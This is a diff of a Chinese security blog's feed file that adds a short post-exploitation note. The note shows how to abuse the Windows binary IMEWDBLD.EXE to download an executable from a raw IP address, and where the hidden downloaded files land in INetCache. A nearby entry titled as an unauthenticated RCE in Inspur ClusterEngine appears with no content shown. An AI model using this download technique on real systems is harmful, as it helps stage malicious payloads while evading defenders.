@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>利用Imewdbld下载文件</title>
+    <link href="/2021/03/05/imewdbld/"/>
+    <url>/2021/03/05/imewdbld/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Using-Imewdbld-to-Download"><a href="#Using-Imewdbld-to-Download" class="headerlink" title="Using Imewdbld to Download"></a>Using Imewdbld to Download</h1><p>一种下载文件的方式</p><p><img src="/img/article2/image-20210305104938086.png" alt="image-20210305104938086"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE http://47.75.197.183/ss/Rar.exe<br></code></pre></td></tr></table></figure><p><img src="/img/article2/image-20210305105008540.png" alt="image-20210305105008540"></p><p>下载目录为</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-variable">%LocalAppData%</span><span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>NetCache<span class="hljs-symbol">\&lt;</span>8_RANDOM_ALNUM_CHARS&gt;/&lt;FILENAME&gt;[1].&lt;EXTENSION&gt;<br></code></pre></td></tr></table></figure><p><img src="/img/article2/image-20210305105023927.png" alt="image-20210305105023927"></p><p>下载后的文件和文件夹是隐藏的，即使开启 “打开隐藏” 也是不会在exploer里面现实的，但是可以使用命令查找路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">forfiles /P <span class="hljs-string">&quot;%localappdata%\Microsoft\Windows\INetCache&quot;</span> /S /M * /C <span class="hljs-string">&quot;cmd /c echo </span><br><span class="hljs-string">@path&quot;</span> <br></code></pre></td></tr></table></figure><p><img src="/img/article2/image-20210305105236738.png" alt="image-20210305105236738"></p><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dir /s <span class="hljs-string">&quot;%localappdata%\Microsoft\Windows\INetCache&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/article2/image-20210305105301019.png" alt="image-20210305105301019"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>AD</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>后渗透</tag>
+      
+      <tag>Tool</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>浪潮clusterengine 未授权RCE</title>
     <link href="/2021/03/02/TSCE/"/>
     <url>/2021/03/02/TSCE/</url>
